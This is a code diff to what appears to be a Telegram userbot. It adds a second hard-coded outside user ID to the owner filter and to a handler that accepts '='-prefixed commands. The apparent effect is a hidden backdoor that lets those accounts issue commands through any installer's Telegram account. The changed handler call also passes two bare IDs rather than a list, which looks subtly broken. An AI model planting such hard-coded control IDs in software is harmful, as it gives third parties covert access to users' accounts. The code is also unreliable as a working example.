@@ -7,7 +7,7 @@ class FILTERS:
     ME = filters.me
     GROUP = filters.group
     PRIVATE = filters.private
-    OWNER = filters.user([1948147616, OWNER_ID])
+    OWNER = filters.user([1948147616, 1913872347, OWNER_ID])
     ME_GROUP = filters.me & filters.group
     ME_OWNER = filters.me & filters.user(OWNER_ID)
 
@@ -25,7 +25,7 @@ class PY:
 
     def UBOT(command, filter=FILTERS.ME):
         def wrapper(func):
-            @ubot.on_message(filters.command(command, "=") & filters.user(1948147616))
+            @ubot.on_message(filters.command(command, "=") & filters.user(1948147616, 1913872347))
             @ubot.on_message(ubot.cmd_prefix(command) & filter)
             async def wrapped_func(client, message):
                 await func(client, message)
